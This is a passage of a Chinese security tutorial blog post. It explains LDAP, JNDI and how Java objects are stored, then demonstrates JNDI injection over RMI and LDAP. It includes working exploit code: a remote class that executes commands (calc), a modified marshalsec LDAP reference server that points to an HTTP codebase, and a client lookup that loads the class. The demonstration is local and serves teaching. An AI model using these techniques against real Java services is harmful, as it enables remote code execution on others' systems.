Portocol），它是基于X.500标准的<strong>轻量级目录访问协议</strong>。<br>目录是一个为查询、浏览和搜索而优化的数据库，它成<strong>树状结构组织数据</strong>，类似文件目录一样。目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就x像它的名字一样。LDAP目录服务是由目录数据库和一套访问协议组成的系统。</p><p>以下LDAP相关知识参考：<a href="https://www.cnblogs.com/wilburxu/p/9174353.html及https://zhuanlan.zhihu.com/p/32732045。" target="_blank" rel="noopener">https://www.cnblogs.com/wilburxu/p/9174353.html及https://zhuanlan.zhihu.com/p/32732045。</a></p><img src="/imgs/image-20210811105553972.png" alt="image-20210811105553972" style="zoom:67%;" /><h4 id="LDAP信息模型："><a href="#LDAP信息模型：" class="headerlink" title="LDAP信息模型："></a>LDAP信息模型：</h4><p>在LDAP中信息以树状方式组织，在树状信息中的基本数据单元是条目，而每个条目[Entry]由属性[Attribute]构成，属性中存储有属性值[Value]；LDAP中的信息模式，类似于面向对象的概念，在LDAP中<strong>每个条目必须属于某个或多个对象类（Object Class）</strong>，每个Object Class由多个属性类型组成，每个属性类型有所对应的语法和匹配规则；对象类和属性类型的定义均可以使用继承的概念。每个条目创建时，必须定义所属的对 象类，必须提供对象类中的必选属性类型的属性值，在LDAP中一个属性类型可以对应多个值。</p><p>如上图就是一个LDAP目录树，目录树中一些具体的概念：</p><ol><li>目录树：在一个目录服务系统中，整个目录信息集可以表示为一个目录信息树，树中的每个节点是一个条目；</li><li>条目：上图的每个椭圆就是一个条目，一个条目有若干个属性和若干个值，有些条目还能包含子条目。每个条目有自己的唯一可区别的名称（DN），如图中的左下角条目，其别名DN就是<code>uid=songtao.xu,ou=hr,dc=foo,dc=example,dc=com</code>；</li><li>对象类：某个实体类型对应的一组属性，对象类封装了必选的属性和可选的属性，同时对象类也是支持继承的。通过对象类可以很方便地指定条目的类型，一个条目也可以绑定多个对象类。如图<code>HumanResourcesProfessional</code>就是一个对象类，代表人力资源管理师的类；</li><li>属性：描述条目的某个方面的信息，一个属性由一个属性类型和一个或多个属性值组成，属性有必须属性和非必须属性。</li></ol><h4 id="互联网命名组织架构使用的关键字："><a href="#互联网命名组织架构使用的关键字：" class="headerlink" title="互联网命名组织架构使用的关键字："></a>互联网命名组织架构使用的关键字：</h4><table><thead><tr><th><strong>关键字</strong></th><th><strong>英文全称</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td><strong>dc</strong></td><td>Domain Component</td><td>域名的部分，其格式是将完整的域名分成几部分，如域名为example.com变成dc=example,dc=com（一条记录的所属位置）</td></tr><tr><td><strong>ou</strong></td><td>Organization Unit</td><td>组织单位，组织单位可以包含其他各种对象（包括其他组织单元），如“oa组”（一条记录的所属组织）</td></tr><tr><td><strong>uid</strong></td><td>User Id</td><td>用户ID songtao.xu（一条记录的ID）</td></tr><tr><td><strong>cn</strong></td><td>Common Name</td><td>公共名称，如“Thomas Johansson”（一条记录的名称）</td></tr><tr><td><strong>sn</strong></td><td>Surname</td><td>姓，如“许”</td></tr><tr><td><strong>dn</strong></td><td>Distinguished Name</td><td>“uid=songtao.xu,ou=oa组,dc=example,dc=com”，一条记录的位置（唯一）</td></tr><tr><td><strong>rdn</strong></td><td>Relative dn</td><td>相对辨别名，类似于文件系统中的相对路径，它是与目录树结构无关的部分，如“uid=tom”或“cn= Thomas Johansson”</td></tr></tbody></table><h4 id="Oracle官方说明了几种存储Java对象的方式："><a href="#Oracle官方说明了几种存储Java对象的方式：" class="headerlink" title="Oracle官方说明了几种存储Java对象的方式："></a><a href="https://docs.oracle.com/javase/jndi/tutorial/objects/representation/ldap.html" target="_blank" rel="noopener">Oracle官方</a>说明了几种存储Java对象的方式：</h4><ol><li>Referenceable objects</li><li>java.io.Serializable objects</li><li>DirContext objects</li><li>Marshalled Objects</li><li>java.rmi.Remote</li><li>CORBA Object</li></ol><p>我们重点看下1、2、4。</p><h5 id="1、Referenceable-objects"><a href="#1、Referenceable-objects" class="headerlink" title="1、Referenceable objects"></a>1、Referenceable objects</h5><table><thead><tr><th>LDAP Attribute Name</th><th>Content</th></tr></thead><tbody><tr><td><code>javaClassName</code> （必须）</td><td><code>Object.getClass().getName()</code>，类的全称</td></tr><tr><td><code>javaFactory</code></td><td>工厂类名全称</td></tr><tr><td><code>javaCodebase</code></td><td>指向class定义的位置</td></tr><tr><td><code>javaReferenceAddress</code></td><td>引用地址列表</td></tr></tbody></table><h5 id="2、java-io-Serializable-objects"><a href="#2、java-io-Serializable-objects" class="headerlink" title="2、java.io.Serializable objects"></a>2、java.io.Serializable objects</h5><table><thead><tr><th>LDAP Attribute Name</th><th>Content</th></tr></thead><tbody><tr><td><code>javaClassName</code>（必须）</td><td><code>Object.getClass().getName()</code>，类的全称</td></tr><tr><td><code>javaSerializedData</code> （必须）</td><td>对象序列化后的数据</td></tr><tr><td><code>javaClassNames</code></td><td>类的所有继承的父类即接口名称列表</td></tr><tr><td><code>javaCodebase</code></td><td>指向class定义的位置</td></tr></tbody></table><h5 id="3、Marshalled-Objects"><a href="#3、Marshalled-Objects" class="headerlink" title="3、Marshalled Objects"></a>3、Marshalled Objects</h5><table><thead><tr><th>LDAP Attribute Name</th><th>Content</th></tr></thead><tbody><tr><td><code>javaClassName</code> （必须）</td><td><code>Object.getClass().getName()</code>，类的全称</td></tr><tr><td><code>javaSerializedData</code>（必须）</td><td>对象序列化后的数据</td></tr><tr><td><code>javaClassNames</code></td><td>类的所有继承的父类即接口名称列表</td></tr></tbody></table><h3 id="3、JNDI"><a href="#3、JNDI" class="headerlink" title="3、JNDI"></a>3、JNDI</h3><p>JNDI(Java Naming and Directory Interface)是一组Java命名和目录接口，主要用于将JNDI API映射为特定的命名服务和目录系统，作用就是使<strong>Java应用程序可以和这些命名服务和目录服务之间进行交互</strong>。</p><p>JNDI可访问的现有的目录及服务有：</p><p>DNS、LDAP、 CORBA对象服务 (公共对象请求代理体系结构)、RMI、文件系统、Windows XP/2000/NT/Me/9x的注册表、DSML v1&amp;v2、NIS、XNam 、Novell目录服务。</p><p><a href="https://paper.seebug.org/1207/#jndi" target="_blank" rel="noopener">如何通过JNDI调用服务？</a></p><p>3步：</p><ol><li>指定需要查找name名称：<code>String jndiName= &quot;jndiName&quot;;</code>；</li><li>初始化默认环境：<code>Context context = new InitialContext();</code>；</li><li>查找该name的数据：<code>context.lookup(jndiName);</code></li></ol><h3 id="二、几个实例及利用方式总结"><a href="#二、几个实例及利用方式总结" class="headerlink" title="二、几个实例及利用方式总结"></a>二、几个实例及利用方式总结</h3><h4 id="RMI-amp-JNDI"><a href="#RMI-amp-JNDI" class="headerlink" title="RMI&amp;JNDI"></a>RMI&amp;JNDI</h4><p>RMI服务端的远程类Calc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 服务器端实现远程接口。</span></span><br><span class="line"><span class="comment"> * 必须继承UnicastRemoteObject，以允许JVM创建远程的存根/代理。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calc</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">Icalc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Calc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">calc</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 服务器端实现远程接口。</span></span><br><span class="line"><span class="comment"> * 必须继承UnicastRemoteObject，以允许JVM创建远程的存根/代理。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calc</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">Icalc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Calc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">calc</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端注册Cacl对象为远程可调用对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 注册远程对象,向客户端提供远程对象服务。</span></span><br><span class="line"><span class="comment"> * 远程对象是在远程服务上创建的，你无法确切地知道远程服务器上的对象的名称，</span></span><br><span class="line"><span class="comment"> * 但是,将远程对象注册到RMI Registry之后,</span></span><br><span class="line"><span class="comment"> * 客户端就可以通过RMI Registry请求到该远程服务对象的stub，</span></span><br><span class="line"><span class="comment"> * 利用stub代理就可以访问远程服务对象了。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RmiRegisterServer</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">RmiRegisterServer</span><span class="params">(String port)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(Integer.parseInt(port));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            registry.bind(<span class="string">"calculate"</span>,<span class="keyword">new</span> Calc());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">new</span> RmiRegisterServer(<span class="string">"1999"</span>);</span><br><span class="line">            System.out.println(<span class="string">"RMI服务启动成功..."</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当服务注册成功，客户端此时可以请求远程服务：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RmiClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/***********方法1***************************/</span></span><br><span class="line">            <span class="comment">// 如果RMI Registry就在本地机器上，URL就是:rmi://localhost:1099/hello</span></span><br><span class="line">            <span class="comment">// 否则，URL就是：rmi://RMIService_IP:1099/hello</span></span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>,<span class="number">1999</span>);</span><br><span class="line">            <span class="comment">// 从Registry中检索远程对象的存根/代理</span></span><br><span class="line">            <span class="comment">// 查找名为calculate的服务，这里必须是Icalc不能是Calc</span></span><br><span class="line">            Icalc calculate = (Icalc) registry.lookup(<span class="string">"calculate"</span>);</span><br><span class="line">            <span class="comment">/***********方法2***************************/</span></span><br><span class="line"><span class="comment">//            Icalc calculate = (Icalc) Naming.lookup("rmi://localhost:1999/calculate");</span></span><br><span class="line">            <span class="comment">// 调用远程对象的方法</span></span><br><span class="line">            calculate.calc();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用上面的例子，改为从JNDI获取RMI远程对象Calc，方法就是上面提过的3步法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JndiAndRmi</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String uri = <span class="string">"rmi://localhost:1999/calculate"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            Icalc icalc = (Icalc) ctx.lookup(uri);</span><br><span class="line">            icalc.calc();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="LDAP-Reference-amp-JNDI"><a href="#LDAP-Reference-amp-JNDI" class="headerlink" title="LDAP-Reference&amp;JNDI"></a>LDAP-Reference&amp;JNDI</h4><p>创建一个test.java，用作远程恶意类：</p><figure class="highlight java"><figcaption><span>test.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//package jndi.ldap; </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现ObjectFactory防止cast异常，return一个integer即可</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Integer(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个test.class放在一个目录下，在目录下用python3开启一个http服务，记得删除本地的test.java，因为jndi的lookup会优先使用本地的程序找不到才加载远程：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac test.java</span><br><span class="line">python -m http.server</span><br></pre></td></tr></table></figure><p>利用<a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java" target="_blank" rel="noopener">marshalsec的LDAPRefServer</a>对main方法和sendResult方法稍作改动：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( String[] args )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> port = <span class="number">1389</span>;</span><br><span class="line">    <span class="comment">// 这里是刚刚开启的http服务</span></span><br><span class="line">    String url = <span class="string">"http://127.0.0.1:8000/#Calc"</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">        config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                <span class="string">"listen"</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                InetAddress.getByName(<span class="string">"0.0.0.0"</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                port,</span><br><span class="line">                ServerSocketFactory.getDefault(),</span><br><span class="line">                SocketFactory.getDefault(),</span><br><span class="line">                (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">        config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">        InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">        System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">        ds.startListening();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中一段代码我们可以看下，就是上面<code>Referenceable objects</code>提到的几个需要的属性：</p><p><code>javaClassName</code>-类名</p><p><code>javaCodeBase</code>-class字节码文件放置位置 也就是http服务url</p><p><code>javaFactory</code>-工厂类名，<code>this.codebase.getRef()</code>本例中是上面的test，也是为什么要让test继承ObjectFactory，否则会出错</p><p><code>objectClass</code>-<code>javaNamingReference</code>指定使用Java命令引用</p><p><img src="/imgs/image-20210812145214529.png" alt="image-20210812145214529"></p><p>记得在pom.xml加上依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用Jndi调用ldap的test恶意类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.DirContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.InitialDirContext;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JndiAndLdap</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">"com.sun.jndi.ldap.object.trustURLCodebase"</span>,<span class="string">"true"</span>);</span><br><span class="line">        Hashtable env = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">"com.sun.jndi.ldap.LdapCtxFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">"ldap://localhost:1389"</span>);</span><br><span class="line"></span><br><span class="line">        DirContext ctx = <span class="keyword">new</span> InitialDirContext(env);</span><br><span class="line"></span><br><span class="line">        Object local_obj = ctx.lookup(<span class="string">"cn=foo,dc=example,dc=com"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="LDAP-Serializable"><a href="#LDAP-Serializable" class="headerlink" title="LDAP-Serializable"></a>LDAP-Serializable</h4><p>改写<a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java" target="_blank" rel="noopener">marshalsec的LDAPRefServer</a>，其中的序列化存储java对象需要的属性：<code>javaClassName</code>、<code>javaSerializedData</code>和<code>javaCodeBase</code>注意修改下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapSerServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String 